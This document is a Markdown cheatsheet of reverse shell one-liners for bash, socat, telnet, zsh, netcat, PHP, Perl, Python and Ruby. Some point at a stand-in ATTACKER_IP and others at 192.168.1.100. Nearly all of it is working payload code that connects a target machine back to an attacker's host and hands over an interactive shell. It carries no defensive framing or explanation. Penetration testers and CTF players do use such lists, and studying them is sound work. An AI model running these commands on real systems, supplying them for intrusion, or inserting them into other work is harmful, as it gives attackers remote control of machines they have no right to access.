# Reverse Shell Cheatsheet

## Bash Reverse Shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0<&1 2>&1
bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
bash -c "bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1"
bash -c "exec bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196
```
## Bash Read Line

```bash
exec 5<>/dev/tcp/192.168.1.100/443;cat <&5 | while read line; do $line 2>&5 >&5; done
```

## Socat

```bash
socat TCP:192.168.1.100:443 EXEC:sh
socat TCP:192.168.1.100:443 EXEC:'sh',pty,stderr,setsid,sigint,sane
```
## Telnet

```bash
TF=$(mktemp -u);mkfifo $TF && telnet 192.168.1.100 443 0<$TF | sh 1>$TF
```

## Zsh

```bash
zsh -c 'zmodload zsh/net/tcp && ztcp 192.168.1.100 443 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```

## NC / Netcat

```bash
nc -e sh 192.168.1.100 443
ncat 192.168.1.100 443 -e sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.1.100 443 >/tmp/f
```

## PHP Reverse Shell

```php
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",PORT);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",PORT);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("ATTACKER_IP",PORT);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",PORT);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",PORT);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("ATTACKER_IP",PORT);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### PHP One Liner

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKER_IP"/PORT 0>&1'");?>
```

## Perl 

```perl
perl -e 'use Socket;$i="192.168.1.100";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

## Python

```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.1.100",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
export RHOST="192.168.1.100";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
export RHOST="192.168.1.100";export RPORT=443;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

## Ruby 

```ruby
ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("192.168.1.100",443))'
ruby -rsocket -e'exit if fork;c=TCPSocket.new("192.168.1.100","443");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```
